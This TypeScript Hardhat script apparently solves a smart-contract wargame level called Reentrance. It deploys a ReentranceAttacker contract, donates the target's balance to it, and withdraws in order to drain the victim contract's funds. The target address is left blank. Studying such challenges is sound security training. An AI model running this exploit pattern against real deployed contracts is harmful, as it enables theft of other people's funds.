import { ethers } from "hardhat";
import * as fs from 'fs';
import { Reentrance__factory, ReentranceAttacker__factory } from '../typechain-types';
import { privateKey, rpc } from "../hardhat.config";

// Task: steal all the funds from the contract

const instanceAddress = ''

const main = async () =>  {
    let tx;
  
    const provider = new ethers.JsonRpcProvider(rpc);
    const signer = new ethers.Wallet(privateKey, provider);

    let balance = await provider.getBalance(instanceAddress);

    const metadata = JSON.parse(fs.readFileSync('./artifacts/contracts/attackers/ReentranceAttacker.sol/ReentranceAttacker.json').toString());
    const factory = new ethers.ContractFactory(metadata.abi, metadata.bytecode, signer);
    const contract = await factory.deploy(instanceAddress, balance);
    await contract.deploymentTransaction()?.wait();

    const attackerAddress = await contract.getAddress();
    const attacker = ReentranceAttacker__factory.connect(attackerAddress, signer);
    const victim = Reentrance__factory.connect(instanceAddress, signer);

    console.log("Hacking the contract...");

    tx = await victim.connect(signer).donate(attackerAddress, { value: balance });
    await tx.wait();

    tx = await attacker.connect(signer).withdraw();
    await tx.wait();

    balance = await provider.getBalance(instanceAddress);

    console.log("Successfully hacked!");
    console.log("Contract balance:", balance);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});